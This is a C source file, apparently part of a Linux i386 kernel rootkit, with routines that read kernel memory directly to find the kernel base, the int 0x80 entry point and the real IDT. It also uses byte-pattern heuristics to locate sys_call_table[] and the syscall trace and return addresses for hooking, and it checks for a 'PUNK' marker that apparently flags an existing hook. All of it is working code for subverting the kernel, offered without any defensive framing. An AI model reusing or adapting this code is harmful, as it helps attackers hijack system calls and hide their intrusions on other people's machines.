/*
 * $Id: extract.c, various kernel-struct extracting routines
 */

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <syscall.h>

#include "sktypes.h"
#include "kernel.h"
#include "kmem.h"
#include "sk.h"
#include "extract.h"
#include "idt.h"

#define	SCLEN	512

/* get kernel delimiting base (0xc0000000 by default) */
ulong	get_kbase()
{
	struct	idtr	idtr;

	get_idt(&idtr);
	return idtr.base & 0xc0000000;
}

/* look for int $0x80 entrypoint */
ulong	get_ep()
{
	struct	idtr	idtr;
	struct	idt	idt[256];

	get_idt(&idtr);

	if (rkm(idt, sizeof(idt), idtr.base) != sizeof(idt))
		return 0;
	dbg("off1 = %x\n", idt[HOOK_INT].off1);
	dbg("off2 = %x\n", idt[HOOK_INT].off2);
	return (IDT_BASE(idt[HOOK_INT]));
}

/*
 * this will search for sys_call_table[]
 * this is really a mess, /usr/src/linux/arch/i386/entry.S:system_call
 * heuristics ...
 */
ulong	get_sct()
{
	uchar	code[SCLEN+256];
	uchar	*p, *pt;
	ulong	r;
	uchar	pt_off, pt_bit;
	int	i;

	kernel_old80 = get_ep();
	if (!kernel_old80)
		return 0;
	if (rkm(code, sizeof(code), kernel_old80-4) <= 0)
		return 0;
	if (!memcmp(code, "PUNK", 4))
		return 0;
	p = (char *) memmem(code, SCLEN, "\xff\x14\x85", 3);
	if (!p) return 0;
	
	pt = (char *) memmem(p+7, SCLEN-(p-code)-7,
		"\xc7\x44\x24\x18\xda\xff\xff\xff\xe8", 9);
	if (!pt) return 0;
	sc.trace = *((ulong *) (pt + 9));
	sc.trace += kernel_old80 + (pt - code) - 4 + 9 + 4;
	
	pt = (char *) memmem(p+7, SCLEN-(p-code)-7, "\xff\x14\x85", 3);
	if (!pt) return 0;
	for (i = 0; i < (p-code); i++) {
		if ((code[i] == 0xf6) && (code[i+1] == 0x43) &&
		    (code[i+4] == 0x75) && (code[i+2] < 127)) {
			pt_off = code[i+2];
			pt_bit = code[i+3];
			goto cc;
		}
	}
	return 0;
cc:
	r = *((ulong *) ((p + 3)));
	dbg("sys_call_table[] at %p\n", (void *) r);
	sc.ret = kernel_old80 + (p - code) - 4 + 7;
	sc.pt_ret = kernel_old80 + (pt - code) - 4 + 7;
	sc.pt_off = pt_off;
	sc.pt_bit = pt_bit;
	dbg("int80=%p, sct=%p, trace=%p, ret=%p, pt_ret=%p, pt_off=%x, pt_bit=%x\n",
	kernel_old80, r, sc.trace, sc.ret, sc.pt_ret, sc.pt_off, sc.pt_bit);
	return r;
//	return 0;
}

/* brute force search for real (non-readonly) idt table when f00f bug
   workaround is enabled */
ulong	get_idt_table(void)
{
	struct	idtr idtr;
	struct	idt idt[256];
	int	i;
	ulong	kbase;

	get_idt(&idtr);
	if (rkm(idt, sizeof(idt), idtr.base) != sizeof(idt))
		return idtr.base;

	kbase = get_kbase();
	for (i = 0; i < 4*1024*1024/4096; i++) {
		char	buf[2048];
		
		if ((rkm(buf, 2048, kbase + i * 4096) == 2048) &&
		    (!memcmp(idt, buf, 2048))) {
			return kbase + i * 4096;
		}
	}
	return idtr.base;
}
